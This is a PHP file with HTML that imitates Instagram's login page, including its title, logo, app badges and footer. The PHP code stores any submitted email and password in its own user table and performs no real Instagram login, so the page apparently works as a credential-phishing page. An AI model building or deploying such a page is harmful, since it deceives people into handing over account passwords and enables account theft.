<?php

require './App/Modal/User.php';
$user = new User();


function reqost($fild){
    return $_REQUEST[$fild] != "" ? $_REQUEST[$fild] : null;
}

if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $email = reqost('email');
    $password = reqost('password');

    if(! is_null($email) && ! is_null($password)){
        try {
            $user -> sigin_chec(compact('email'));
            $users = $user -> fetchsinin;
            
            if($users){
              if($email == $users -> email){

              }
              
            }else{
              $user -> creat(compact('email' , 'password'));
            }
    
          } catch (\Exception $er) {
            
          }
    }
} 


?>




<!-- partial:index.partial.html -->
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Login &#8226; Instagram</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="/dist/style.css">
</head>

<body>
    <div class="container COS">
        <div class="row">
            <div class="col-md-4 m-auto">
                <div class="card card-body mt-2">
                    <img src="https://raw.githubusercontent.com/Cshayan/Instagram-Login-Page-Using-SCSS/master/Images/instagram.png" alt="instagram">
                    <div class="col-md-12 m-auto">
                        <form action="#" class="form-container" id="form" method="post">
                            <div class="form-group">
                                <input type="text" name="email" id="email" class="form-control" onkeyup="manage()" placeholder="Phone number, username, or email"
                                    required>
                            </div>
                            <div class="form-group">
                                <input type="password" name="password" id="password" class="form-control" onkeyup="manage()" placeholder="Password" required>
                            </div>
                            <div class="form-group">
                                <input type="submit" id="submit" class="btn btn-primary btn-block" value="Log In">
                            </div>
                        </form>
                        <div class="or">
                            <div class="line"></div>
                            OR
                            <div class="line"></div>
                        </div>
                        <div class="facebook-container">
                            <a href="#" class="fb-login"><i class="fa fa-facebook" aria-hidden="true"></i> Log in with Facebook</a>
                        </div>
                        <div class="text-center forgot-pass">
                            <a href="#">Forgot Password?</a>
                        </div>
                    </div>
                </div>
                <div class="card card-body signup text-center">
                    <div> Don't have an account? <a href="#">Sign up</a></div>
                </div>
                <div class="app-container text-center">
                    Get the app.
                    <div class="logo-container">
                        <a href="#" id="img1"><img src="https://raw.githubusercontent.com/Cshayan/Instagram-Login-Page-Using-SCSS/master/Images/appstore.png" alt="appstore"></a>
                        <a href="#" id="img2"><img src="https://raw.githubusercontent.com/Cshayan/Instagram-Login-Page-Using-SCSS/master/Images/googleplay.png" alt="appstore"></a>
                    </div>
                </div>
            </div>
        </div>
        <footer class="footer">
            <div>
                <a href="#">About Us</a>
                <a href="#">Support</a>
                <a href="#">Press</a>
                <a href="#">API</a>
                <a href="#">Jobs</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Directory</a>
                <a href="#">Profiles</a>
                <a href="#">Hashtags</a>
                <a href="#">Language</a>
            </div>
            <div>
                <p id="insta">&copy; <span id="year"></span> INSTAGRAM</p>
            </div>
        </footer>
    </div>
    <script src="js/script.js"></script>
</body>

</html>

